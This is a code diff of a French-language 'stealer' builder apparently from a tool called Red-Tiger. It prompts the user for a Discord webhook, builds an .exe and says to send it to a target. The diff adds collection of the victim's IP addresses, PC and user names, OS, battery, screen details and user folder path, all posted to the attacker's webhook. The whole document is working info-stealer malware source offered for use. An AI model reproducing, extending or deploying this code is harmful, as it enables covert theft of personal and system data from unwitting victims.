@@ -1,11 +1,11 @@
-import subprocess
-import os
-import time
-
 from Options.Options import *
 
-TitrePage("Red-Tiger | Stealer Create")
-
+TitrePage("Stealer Create")
+LAPprint(f"{couleur.RED}\nLe stealer vous donne les informations du PC qui lance le .exe\nIl y a seulement vous qui voyez les informations de la personne grâce à votre Webhook.")
+LAPprint(f"{couleur.RED}\nInformations que vous récuperer:")
+LAPprint(f"""{couleur.YELLOW}- Ip: Local, Publique, ipv4, ipv6
+- Info Pc: Composant, Nom, Plateforme, Périphérique
+- Et bien plus ! """)
 LAPprint(f"{couleur.RED}\nMettez votre Webhook, laissez l'installation se faire, puis envoyez-le à votre cible !")
 webhook = input(f"\n{couleur.RED}Entre le lien de ton Webhook -> {couleur.RESET}")
 LAPprint(f"{couleur.RED}\nConversion en fichier exécutable (.exe):{couleur.RESET}")
@@ -27,6 +27,8 @@ import os
 import platform
 import requests
 import psutil
+import ctypes
+from screeninfo import get_monitors
 
 
 #Recuperation du nom du pc
@@ -91,6 +93,82 @@ espace_disque = round(disk_info.total / (1024**3), 2)
 espace_utilise_disque = round(disk_info.used / (1024**3), 2)
 espace_dispo_disque = round(disk_info.free / (1024**3), 2)
 
+
+#Lettre disque dur
+repertoire_courant = os.getcwd()
+
+lettre_lecteur = os.path.splitdrive(repertoire_courant)[0]
+
+
+#Recuperer portable ou fix
+def is_portable():
+    try:
+        battery = psutil.sensors_battery()
+        return battery is not None and battery.power_plugged is not None
+    except AttributeError:
+        return False
+
+if is_portable():
+    plateforme_info = 'Pc Portable'
+else:
+    plateforme_info = 'Pc Fixe'
+
+
+#Recuperer le pourcentage de batterie
+if hasattr(psutil, 'sensors_battery'):
+    batterie = psutil.sensors_battery()
+    if batterie:
+        batterie_info = {
+            'Batterie Status': batterie.power_plugged,
+            'Batterie Pourcent': batterie.percent
+        }
+    else:
+        batterie_info = {
+            'Batterie Status': 'None',
+            'Batterie Pourcent': 'None'
+        }
+
+
+#Recuperer les info ECRAN PRINCIPAL:
+def get_resolution():
+    hdc = ctypes.windll.user32.GetDC(0)
+    width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8)  
+    height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10)
+    ctypes.windll.user32.ReleaseDC(0, hdc)
+    return width, height
+
+for i, monitor in enumerate(get_monitors(), 1):
+    if monitor.is_primary:
+        width, height = get_resolution()
+        name = monitor.name
+        is_primary = 'Oui'
+
+principal_ecran = f'Nom: "{name}", Resolution: "{width}x{height}", Ecran Principal: "{is_primary}"'
+
+#Recuperer info ECRAN SECONDAIRE
+def get_resolution():
+    hdc = ctypes.windll.user32.GetDC(0)
+    width = ctypes.windll.gdi32.GetDeviceCaps(hdc, 8) 
+    height = ctypes.windll.gdi32.GetDeviceCaps(hdc, 10) 
+    ctypes.windll.user32.ReleaseDC(0, hdc)
+    return width, height
+
+
+monitors = list(get_monitors())
+
+if len(monitors) > 1:
+
+    second_monitor = monitors[1]
+
+    width, height = get_resolution()
+
+    second_ecran =  f'Nom: "{second_monitor.name}", Resolution: "{width}x{height}", Ecran Principal: "Non"'
+else:
+    second_ecran = 'N/A'
+
+
+
+
 #Envoie de l'embed dans le discord
 def send_embed(webhook_url, title, color=0xf00020):
 
@@ -105,8 +183,8 @@ def send_embed(webhook_url, title, color=0xf00020):
 
     data = {
         'embeds': [embed_data],
-        'username': username,  # Ajout du nom du webhook
-        'avatar_url': avatar_url  # Ajout de l'URL de la photo de profil du webhook
+        'username': username,  
+        'avatar_url': avatar_url 
     }
 
 
@@ -123,6 +201,7 @@ def send_embed(webhook_url, title, color=0xf00020):
 embed_title = f'Red-Tiger | Info "{nom_pc}"'
 
 fields = [
+{"name": f"Plateforme:", "value": f"```{plateforme_info}```", "inline": True},
 {"name": f"Nom Pc:", "value": f"```{nom_pc}```", "inline": True},
 {"name": f"Nom Utilisateur:", "value": f"```{nom_utilisateur}```", "inline": True},
 {"name": f"Systeme D'Exploitation:", "value": f"```{system_info}, Version: {system_version_info}```", "inline": True},
@@ -135,6 +214,14 @@ fields = [
 {"name": f"Ip Local:", "value": f"```{ip_address_local}```", "inline": True},
 {"name": f"Ipv4:", "value": f"```{ip_address_ipv4}```", "inline": True},
 {"name": f"Ipv6:", "value": f"```{ip_address_ipv6}```", "inline": True},
+
+{"name": f"Ecran Principal:", "value": f'```{principal_ecran}```', "inline": False},
+{"name": f"Ecran Secondaire:", "value": f'```{second_ecran}```', "inline": False},
+
+{"name": f"Lettre Lecteur:", "value": f"```{lettre_lecteur}```", "inline": True},
+{"name": f"Chemin Dossier:", "value": f"```{lettre_lecteur}/Users/{nom_utilisateur}```", "inline": True},
+
+
 #{"name": f"", "value": f"```{}```", "inline": True},
 ]
 author =  {
